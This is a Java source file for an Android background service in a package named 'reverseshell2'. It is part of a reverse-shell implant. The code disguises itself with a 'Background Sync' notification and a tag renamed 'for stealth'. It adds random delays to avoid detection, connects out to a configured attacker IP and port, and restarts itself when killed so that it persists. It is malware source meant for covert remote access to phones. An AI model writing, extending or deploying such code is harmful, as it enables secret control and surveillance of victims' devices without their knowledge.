package com.example.reverseshell2;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.os.Build;
import androidx.core.app.NotificationCompat;
import androidx.annotation.Nullable;
import java.util.Random;

public class mainService extends Service {
    static String TAG ="SyncService"; // Changed from mainServiceClass for stealth
    private static final String CHANNEL_ID = "background_sync_channel";
    private static final int NOTIFICATION_ID = 1001;
    private Random random = new Random();
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG,"Starting background sync service");
        
        // Create legitimate-looking foreground notification for Android 8+
        startForeground(NOTIFICATION_ID, createNotification());
        
        // Initialize WorkManager for background tasks
        try {
            WorkScheduler.initializeAllWork(this);
            Log.d(TAG, "WorkManager tasks initialized");
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize WorkManager", e);
        }
        
        // Add random delay to avoid pattern detection
        int delay = 3000 + random.nextInt(7000); // 3-10 seconds
        new android.os.Handler().postDelayed(() -> {
            try {
                // Try secure connection first, fallback to regular
                SecureTcpConnection secureConn = new SecureTcpConnection();
                if (secureConn.connect(config.IP, Integer.parseInt(config.port))) {
                    Log.d(TAG, "Secure connection established from service");
                    secureConn.disconnect(); // Just test connection
                } else {
                    // Fallback to regular connection
                    new jumper(getApplicationContext()).init();
                }
            } catch (Exception e) {
                Log.e(TAG, "Connection failed, will retry via WorkManager", e);
                // WorkManager will handle retries
            }
        }, delay);
        
        return START_STICKY;
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Background Sync",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Syncing app data in background");
            channel.setShowBadge(false);
            channel.setSound(null, null);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    private android.app.Notification createNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, intent, 
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? 
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE : 
                PendingIntent.FLAG_UPDATE_CURRENT
        );
        
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Background Sync")
            .setContentText("Syncing app data...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG,"Service destroyed, restarting...");
        
        // Restart service if killed (persistence)
        Intent restartIntent = new Intent(getApplicationContext(), this.getClass());
        startService(restartIntent);
    }
}
